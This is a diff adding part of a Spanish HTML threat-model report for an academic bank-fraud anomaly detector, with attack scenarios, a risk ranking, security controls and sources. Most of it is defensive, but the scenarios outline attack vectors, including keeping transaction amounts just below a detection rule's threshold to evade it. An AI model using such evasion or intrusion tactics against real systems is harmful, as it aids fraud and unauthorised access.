+    <tr><td><strong>Vector de ataque</strong></td><td>POST con JSON array de 10 millones de eventos, o 10 000 peticiones concurrentes</td></tr>
+    <tr><td><strong>Impacto técnico</strong></td><td><code>OutOfMemoryError</code> en JVM; el panel deja de responder</td></tr>
+    <tr><td><strong>Riesgo asociado</strong></td><td class="alta">R06 (ALTO)</td></tr>
+    <tr><td><strong>Controles recomendados</strong></td><td><code>spring.servlet.multipart.max-request-size=10MB</code>; rate limiter; autenticación requerida</td></tr>
+  </tbody>
+</table>
+
+<h2>Escenario 8 — Credenciales hardcoded en el repositorio</h2>
+<table>
+  <tbody>
+    <tr><td><strong>Tipo</strong></td><td>Fallo humano</td></tr>
+    <tr><td><strong>Vector de ataque</strong></td><td>Búsqueda en GitHub de <code>spring.datasource.password=</code> en el repositorio del proyecto</td></tr>
+    <tr><td><strong>Impacto técnico</strong></td><td>Acceso completo a la BD; lectura, modificación o eliminación de <code>anomalias_detectadas</code></td></tr>
+    <tr><td><strong>Riesgo asociado</strong></td><td class="critica">R04 (CRÍTICO)</td></tr>
+    <tr><td><strong>Controles recomendados</strong></td><td><code>${DB_PASS}</code> en properties; <code>application-prod.properties</code> en <code>.gitignore</code>; rotación de credenciales si hay exposición</td></tr>
+  </tbody>
+</table>
+
+<h2>Escenario 9 — Sesión de auditor robada (JWT sin expiración corta)</h2>
+<table>
+  <tbody>
+    <tr><td><strong>Tipo</strong></td><td>Ataque</td></tr>
+    <tr><td><strong>Vector de ataque</strong></td><td>Interceptación del JWT en red WiFi sin HTTPS (R18), o robo vía XSS (Escenario 6)</td></tr>
+    <tr><td><strong>Impacto en el negocio</strong></td><td>El atacante puede marcar todos los fraudes detectados como revisados, enmascarando el problema</td></tr>
+    <tr><td><strong>Riesgo asociado</strong></td><td class="alta">R08, R18 (ALTO)</td></tr>
+    <tr><td><strong>Controles recomendados</strong></td><td>JWT con <code>exp</code> máximo 1h; HTTPS obligatorio; lista negra de tokens invalidados (<code>jti</code> en Redis)</td></tr>
+  </tbody>
+</table>
+
+<h2>Escenario 10 — Evasión adversarial del detector (reglas conocidas)</h2>
+<table>
+  <tbody>
+    <tr><td><strong>Tipo</strong></td><td>Ataque avanzado + fallo de diseño</td></tr>
+    <tr><td><strong>Vector de ataque</strong></td><td>Atacante lee el código del detector, aprende que ANO-001 se dispara para importes en [9000,9999], y usa importes de 8500€</td></tr>
+    <tr><td><strong>Impacto técnico</strong></td><td>Recall del detector cae a 0% para el tipo de fraude que el atacante adapta</td></tr>
+    <tr><td><strong>Riesgo asociado</strong></td><td class="alta">R12 (ALTO)</td></tr>
+    <tr><td><strong>Controles recomendados</strong></td><td>Repositorio privado para <code>/detector</code>; umbrales en configuración externa; márgenes dinámicos basados en estadísticas</td></tr>
+  </tbody>
+</table>
+
+<!-- ================================================================
+     PRIORIZACIÓN DE RIESGOS
+================================================================ -->
+<h1>Priorización de riesgos</h1>
+<p><em>Fórmula: <strong>Prioridad = Probabilidad × Impacto × Facilidad</strong> (escala 1–5 cada variable)</em></p>
+
+<table>
+  <thead>
+    <tr><th>Código</th><th>Descripción breve</th><th>P</th><th>I</th><th>F</th><th>Prioridad</th><th>Acción</th></tr>
+  </thead>
+  <tbody>
+    <tr class="p100"><td>R11</td><td>Endpoints sin autenticación</td><td>5</td><td>5</td><td>4</td><td class="critica">100</td><td>Inmediata: Spring Security en todos los endpoints</td></tr>
+    <tr class="p100"><td>R04</td><td>Credenciales hardcoded en repo</td><td>4</td><td>5</td><td>5</td><td class="critica">100</td><td>Inmediata: variables de entorno + pre-commit hook</td></tr>
+    <tr class="p80"><td>R01</td><td>IDOR en panel</td><td>4</td><td>5</td><td>4</td><td class="alta">80</td><td>Inmediata: <code>@PreAuthorize</code> con JWT</td></tr>
+    <tr class="p80"><td>R09</td><td>Fuerza bruta sin rate-limit</td><td>4</td><td>4</td><td>5</td><td class="alta">80</td><td>Alta: rate limiter + bloqueo tras 5 intentos</td></tr>
+    <tr class="p100"><td>R03</td><td>Verdad oculta en repo</td><td>3</td><td>5</td><td>5</td><td class="critica">75</td><td>Inmediata: <code>.gitignore</code> + hook</td></tr>
+    <tr class="p60"><td>R06</td><td>DoS batch sin límite</td><td>3</td><td>4</td><td>5</td><td>60</td><td>Alta: max-request-size</td></tr>
+    <tr><td>R19</td><td>Sin separación entornos dev/prod</td><td>4</td><td>4</td><td>3</td><td>48</td><td>Alta: perfiles Spring separados</td></tr>
+    <tr><td>R17</td><td>Sin paginación en API</td><td>4</td><td>3</td><td>4</td><td>48</td><td>Alta: <code>?limit=50&amp;offset=0</code> obligatorio</td></tr>
+    <tr><td>R05</td><td>Actuator expuesto</td><td>3</td><td>4</td><td>4</td><td>48</td><td>Alta: <code>include=health,info</code> en prod</td></tr>
+    <tr><td>R08</td><td>JWT robado sin HTTPS</td><td>3</td><td>4</td><td>4</td><td>48</td><td>Alta: HTTPS + exp corto</td></tr>
+    <tr><td>R18</td><td>Sin HTTPS</td><td>3</td><td>4</td><td>4</td><td>48</td><td>Alta: HTTPS obligatorio</td></tr>
+    <tr><td>R02</td><td>Log injection</td><td>3</td><td>4</td><td>3</td><td>36</td><td>Media: sanitización campo <code>concepto</code></td></tr>
+    <tr><td>R12</td><td>Reglas detector expuestas</td><td>3</td><td>4</td><td>3</td><td>36</td><td>Media: repo privado para <code>/detector</code></td></tr>
+    <tr><td>R15</td><td>Sin cifrado datos en reposo</td><td>3</td><td>4</td><td>3</td><td>36</td><td>Media: H2 <code>CIPHER=AES</code></td></tr>
+    <tr><td>R07</td><td>SQL injection vía <code>concepto</code></td><td>2</td><td>5</td><td>3</td><td>30</td><td>Media: PreparedStatement siempre</td></tr>
+    <tr><td>R13</td><td>Backup sin cifrar</td><td>2</td><td>5</td><td>3</td><td>30</td><td>Media: cifrado backup</td></tr>
+    <tr><td>R14</td><td>Dependencias vulnerables</td><td>3</td><td>3</td><td>3</td><td>27</td><td>Baja: OWASP Dependency-Check en CI</td></tr>
+    <tr><td>R20</td><td>Sin idempotencia ingestión</td><td>3</td><td>3</td><td>3</td><td>27</td><td>Baja: hash SHA-256 de fichero procesado</td></tr>
+    <tr><td>R10</td><td>Datos sensibles en logs</td><td>2</td><td>4</td><td>3</td><td>24</td><td>Baja: seudonimización en producción</td></tr>
+    <tr><td>R16</td><td>Gap temporal en logs</td><td>3</td><td>4</td><td>2</td><td>24</td><td>Baja: monitorización alertas</td></tr>
+  </tbody>
+</table>
+
+<!-- ================================================================
+     CONTROLES PROPUESTOS
+================================================================ -->
+<h1>Controles propuestos</h1>
+
+<h2>Controles preventivos</h2>
+<table>
+  <thead><tr><th>ID</th><th>Control</th><th>Aplica a</th><th>Riesgos mitigados</th></tr></thead>
+  <tbody>
+    <tr><td>CP-01</td><td>Variables de entorno para todas las credenciales (<code>${DB_PASS}</code>, <code>${JWT_SECRET}</code>)</td><td>A-07, A-08</td><td>R04, R08</td></tr>
+    <tr><td>CP-02</td><td><code>verdad_oculta*.csv</code> en <code>.gitignore</code> + pre-commit hook</td><td>A-03</td><td>R03</td></tr>
+    <tr><td>CP-03</td><td>Spring Security con autenticación JWT en todos los endpoints</td><td>A-09, A-05</td><td>R01, R09, R11</td></tr>
+    <tr><td>CP-04</td><td>Escapar/rechazar <code>|</code> y <code>\n</code> en campo <code>concepto</code></td><td>A-01, A-09</td><td>R02, R07</td></tr>
+    <tr><td>CP-05</td><td>HTTPS obligatorio en producción (TLS 1.3)</td><td>A-05, A-09</td><td>R18</td></tr>
+    <tr><td>CP-06</td><td><code>management.endpoints.web.exposure.include=health,info</code> en prod</td><td>A-05, A-07</td><td>R05</td></tr>
+    <tr><td>CP-07</td><td>Perfiles Spring separados: <code>application-dev.properties</code> / <code>application-prod.properties</code> (prod en <code>.gitignore</code>)</td><td>A-08</td><td>R19</td></tr>
+    <tr><td>CP-08</td><td><code>spring.servlet.multipart.max-request-size=10MB</code> + rate limiter en endpoints de ingestión</td><td>A-09, A-10</td><td>R06</td></tr>
+    <tr><td>CP-09</td><td>Paginación obligatoria en endpoints de consulta (<code>?limit=50&amp;offset=0</code>)</td><td>A-09</td><td>R17</td></tr>
+    <tr><td>CP-10</td><td>Repositorio privado para el módulo <code>/detector</code></td><td>A-06</td><td>R12</td></tr>
+  </tbody>
+</table>
+
+<h2>Controles detectivos</h2>
+<table>
+  <thead><tr><th>ID</th><th>Control</th><th>Aplica a</th><th>Riesgos mitigados</th></tr></thead>
+  <tbody>
+    <tr><td>CD-01</td><td>Log de auditoría de acciones del auditor (alertas revisadas, IP, timestamp)</td><td>A-05</td><td>R01, R08</td></tr>
+    <tr><td>CD-02</td><td>Alerta si un mismo auditor revisa más de 50 alertas en menos de 5 min</td><td>A-05</td><td>R08</td></tr>
+    <tr><td>CD-03</td><td>OWASP Dependency-Check en CI/CD para detectar CVEs en dependencias Maven</td><td>A-05, A-06</td><td>R14</td></tr>
+    <tr><td>CD-04</td><td>Monitorización de gaps temporales en logs: alerta si más de 2h sin eventos (ANO-036)</td><td>A-01</td><td>R16</td></tr>
+    <tr><td>CD-05</td><td>Registro de hash SHA-256 de ficheros procesados; alerta si el mismo hash se procesa dos veces</td><td>A-04</td><td>R20</td></tr>
+  </tbody>
+</table>
+
+<h2>Controles correctivos</h2>
+<table>
+  <thead><tr><th>ID</th><th>Control</th><th>Aplica a</th><th>Riesgos mitigados</th></tr></thead>
+  <tbody>
+    <tr><td>CC-01</td><td>Procedimiento de rotación de credenciales en menos de 1h si se detecta exposición en repo</td><td>A-07</td><td>R04</td></tr>
+    <tr><td>CC-02</td><td>Eliminación del historial git si <code>verdad_oculta.csv</code> se sube accidentalmente (BFG Repo Cleaner)</td><td>A-03</td><td>R03</td></tr>
+    <tr><td>CC-03</td><td>Invalidación inmediata de JWT si se detecta sesión sospechosa (múltiples IPs o horario inusual)</td><td>A-05</td><td>R08</td></tr>
+  </tbody>
+</table>
+
+<h2>Controles compensatorios</h2>
+<table>
+  <thead><tr><th>ID</th><th>Control</th><th>Aplica a</th><th>Riesgos mitigados</th></tr></thead>
+  <tbody>
+    <tr><td>CK-01</td><td>Backup cifrado diario de <code>anomalias_detectadas</code> en almacenamiento separado</td><td>A-04</td><td>R13, R15</td></tr>
+    <tr><td>CK-02</td><td>Seudonimización de IBANs en logs para cumplir RGPD (sustituir ES1234 por tokens internos)</td><td>A-01, A-02</td><td>R10</td></tr>
+  </tbody>
+</table>
+
+<h2>Controles organizativos</h2>
+<table>
+  <thead><tr><th>ID</th><th>Control</th><th>Aplica a</th><th>Riesgos mitigados</th></tr></thead>
+  <tbody>
+    <tr><td>CO-01</td><td>Nadie sube directamente a <code>main</code>; toda integración vía Pull Request aprobada por el coordinador</td><td>Proceso</td><td>R03, R04</td></tr>
+    <tr><td>CO-02</td><td>Checklist de revisión de PR: ¿hay credenciales? ¿hay <code>verdad_oculta</code>? ¿hay <code>target/</code>?</td><td>Proceso</td><td>R03, R04</td></tr>
+    <tr><td>CO-03</td><td>Formación del equipo en OWASP Top 10 y OWASP API Security Top 10</td><td>Equipo</td><td>R01, R02, R07, R09</td></tr>
+    <tr><td>CO-04</td><td>Documentar responsable por cada activo (A-01..A-10) con contacto de escalado</td><td>Proceso</td><td>General</td></tr>
+  </tbody>
+</table>
+
+<!-- ================================================================
+     CONCLUSIÓN CRÍTICA
+================================================================ -->
+<h1>Conclusión crítica</h1>
+
+<h2>Los tres riesgos bloqueantes</h2>
+
+<div class="blocker">
+  <strong>R11 — Endpoints sin autenticación (Prioridad 100):</strong> En la versión 0.3, cualquier persona en la red puede leer todas las anomalías detectadas, subir logs falsos y destruir la integridad de la evaluación. Este riesgo existe <em>ahora mismo</em> y debe resolverse antes de desplegar el proyecto fuera del entorno local.
+</div>
+
+<div class="blocker">
+  <strong>R04 — Credenciales en repositorio (Prioridad 100):</strong> Si la contraseña de la BD se sube al repo, cualquier persona con acceso puede vaciar o destruir <code>anomalias_detectadas</code>. En un proyecto real, esto sería un incidente con obligación de notificación al regulador en 72h (RGPD Art. 33).
+</div>
+
+<div class="blocker">
+  <strong>R03 — Verdad oculta en repositorio (Prioridad 75):</strong> El fichero <code>verdad_oculta.csv</code> es el corazón de la evaluación. Si se sube, el ejercicio pierde todo su valor académico. Es prácticamente irreversible: aunque se borre del árbol, el historial de git lo conserva indefinidamente.
+</div>
+
+<h2>Controles esenciales mínimos (no negociables)</h2>
+<ul>
+  <li><code>verdad_oculta*.csv</code> en <code>.gitignore</code> <strong>antes del primer commit</strong> de Juan Carlos</li>
+  <li>Credenciales en variables de entorno en <strong>todos</strong> los entornos</li>
+  <li>Spring Security activado con autenticación JWT en <strong>todos</strong> los endpoints del panel</li>
+  <li>HTTPS habilitado en cualquier despliegue fuera del equipo local</li>
+  <li>Actuator reducido a <code>health,info</code> en el perfil de producción</li>
+</ul>
+
+<h2>Riesgos residuales aceptados</h2>
+<ul>
+  <li><strong>R12 (Evasión adversarial):</strong> Un atacante motivado que conozca las reglas del detector siempre puede ajustar su comportamiento. Se acepta como limitación del diseño académico.</li>
+  <li><strong>R16 (Gap temporal en logs):</strong> Los logs sintéticos pueden tener vacíos temporales que el detector interprete como anomalías. Se acepta un recall imperfecto como parte del ejercicio.</li>
+  <li><strong>R14 (Dependencias vulnerables):</strong> Spring Boot 3.2 tiene un ciclo de parches activo, pero nuevos CVEs pueden aparecer. El control CD-03 mitiga pero no elimina este riesgo.</li>
+</ul>
+
+<h2>Estrategia de resiliencia</h2>
+<ol style="padding-left:20px; margin-bottom:12px;">
+  <li><strong>Prevenir</strong> — controles CP-01..CP-10 evitan que los riesgos se materialicen</li>
+  <li><strong>Detectar</strong> — controles CD-01..CD-05 identifican incidentes en tiempo real</li>
+  <li><strong>Responder</strong> — controles CC-01..CC-03 limitan el daño una vez detectado el incidente</li>
+  <li><strong>Recuperar</strong> — control CK-01 (backup cifrado) garantiza una versión limpia para restaurar</li>
+</ol>
+
+<!-- ================================================================
+     FUENTES
+================================================================ -->
+<h1>Fuentes</h1>
+<table>
+  <thead><tr><th>Código</th><th>Fuente</th><th>Aplicación en el proyecto</th></tr></thead>
+  <tbody>
+    <tr><td>F-01</td><td>OWASP Top 10 2021 (A01 Broken Access Control, A03 Injection, A07 Identification Failures)</td><td>R01, R07, R09</td></tr>
+    <tr><td>F-02</td><td>OWASP API Security Top 10 2023 (API1 BOLA/IDOR, API4 Unrestricted Resource Consumption)</td><td>R01, R06</td></tr>
+    <tr><td>F-03</td><td>OWASP ASVS v4.0 (Chapter 4: Access Control, Chapter 8: Data Protection)</td><td>R01, R10, R15</td></tr>
+    <tr><td>F-04</td><td>OWASP REST Security Cheat Sheet</td><td>R02, R07, R17</td></tr>
+    <tr><td>F-05</td><td>Spring Security Reference — JWT Authentication, Method Security (<code>@PreAuthorize</code>)</td><td>R01, R08, R09, R11</td></tr>
+    <tr><td>F-06</td><td>Spring Boot Actuator Security Guide</td><td>R05</td></tr>
+    <tr><td>F-07</td><td>Ley 10/2010 de prevención del blanqueo de capitales y financiación del terrorismo</td><td>ANO-001..010, ANO-045..049</td></tr>
+    <tr><td>F-08</td><td>Reglamento (UE) 2016/679 — RGPD, Art. 32 y Art. 33 (notificación brechas 72h)</td><td>R10, R13</td></tr>
+    <tr><td>F-09</td><td>Esquema Nacional de Seguridad (ENS) — Dimensiones de seguridad y niveles de protección</td><td>Tarea 3 (matriz)</td></tr>
+    <tr><td>F-10</td><td>NIST SP 800-61r2 — Computer Security Incident Handling Guide</td><td>CC-01..CC-03</td></tr>
+  </tbody>
+</table>
+
+<hr style="margin:32px 0; border-color:#d1d5db;"/>
+<p style="text-align:center; color:#6b7280; font-size:9.5pt;">
+  DetecciónAnomalíasBancarias v0.3 · 25/05/2026 · Generado automáticamente — abre en Chrome y pulsa <strong>Guardar PDF</strong> o Ctrl+P
+</p>
+
+</body>
+</html>
